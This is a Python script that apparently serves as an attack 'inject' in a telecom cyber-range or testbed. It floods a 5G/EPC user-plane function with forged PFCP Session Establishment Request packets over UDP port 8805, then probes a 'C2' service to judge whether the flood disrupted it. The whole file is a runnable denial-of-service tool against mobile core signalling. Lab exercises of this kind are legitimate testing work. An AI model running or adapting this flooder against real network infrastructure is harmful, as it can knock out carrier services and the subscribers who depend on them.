#!/usr/bin/env python3
"""pfcp_flood (INJECT): send PFCP packet burst and infer disruption conservatively."""

from __future__ import annotations

import json
import os
import random
import socket
import struct
import sys
import time

DEFAULT_HOST = os.environ.get("PFCP_HOST", "epc_upf")
DEFAULT_PORT = int(os.environ.get("PFCP_PORT", "8805"))
DEFAULT_COUNT = int(os.environ.get("PFCP_FLOOD_COUNT", "200"))
DEFAULT_INTERVAL_MS = int(os.environ.get("PFCP_FLOOD_INTERVAL_MS", "5"))
C2_HOST = os.environ.get("C2_CHECK_HOST", "172.30.0.20")
C2_PORT = int(os.environ.get("C2_CHECK_PORT", "8080"))


def emit(accepted: bool, blocked_by: str | None, effect: dict[str, str] | None = None) -> None:
    out = {
        "accepted": bool(accepted),
        "blocked_by": blocked_by,
        "effect": effect if (accepted and effect) else {},
        "signed": None,
    }
    print(json.dumps(out))


def parse_args(argv: list[str]) -> tuple[str, int, int]:
    host = DEFAULT_HOST
    port = DEFAULT_PORT
    count = DEFAULT_COUNT
    toks: list[str] = []
    for a in argv[1:]:
        toks.extend(str(a).split())
    i = 0
    while i < len(toks):
        t = toks[i]
        if t == "count" and i + 1 < len(toks):
            try:
                count = int(toks[i + 1])
            except ValueError:
                pass
            i += 2
            continue
        if ":" in t:
            h, p = t.rsplit(":", 1)
            host = h or host
            try:
                port = int(p)
            except ValueError:
                pass
        i += 1
    return host, port, max(1, count)


def tcp_up(host: str, port: int, timeout_s: float = 1.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout_s):
            return True
    except OSError:
        return False


def build_pfcp_packet(seid: int, seq: int) -> bytes:
    # Minimal PFCP Session Establishment Request-like frame (type 50).
    flags = 0x21
    msg_type = 50
    length = 12
    header = struct.pack("!BBH", flags, msg_type, length)
    seid_b = struct.pack("!Q", seid & 0xFFFFFFFFFFFFFFFF)
    seq_b = bytes([(seq >> 16) & 0xFF, (seq >> 8) & 0xFF, seq & 0xFF, 0x00])
    return header + seid_b + seq_b


def flood(host: str, port: int, count: int, interval_ms: int) -> int:
    sent = 0
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        for _ in range(count):
            seid = random.getrandbits(64)
            seq = random.getrandbits(24)
            pkt = build_pfcp_packet(seid, seq)
            try:
                s.sendto(pkt, (host, port))
                sent += 1
            except OSError:
                break
            if interval_ms > 0:
                time.sleep(interval_ms / 1000.0)
    return sent


def main() -> None:
    host, port, count = parse_args(sys.argv)
    before = tcp_up(C2_HOST, C2_PORT)
    try:
        sent = flood(host, port, count, DEFAULT_INTERVAL_MS)
    except OSError:
        sent = 0
    time.sleep(0.5)
    after = tcp_up(C2_HOST, C2_PORT)

    disrupted = before and (not after)
    if sent > 0 and disrupted:
        emit(True, None, {"c2": "disrupted"})
        return
    emit(False, "no_effect")


if __name__ == "__main__":
    main()
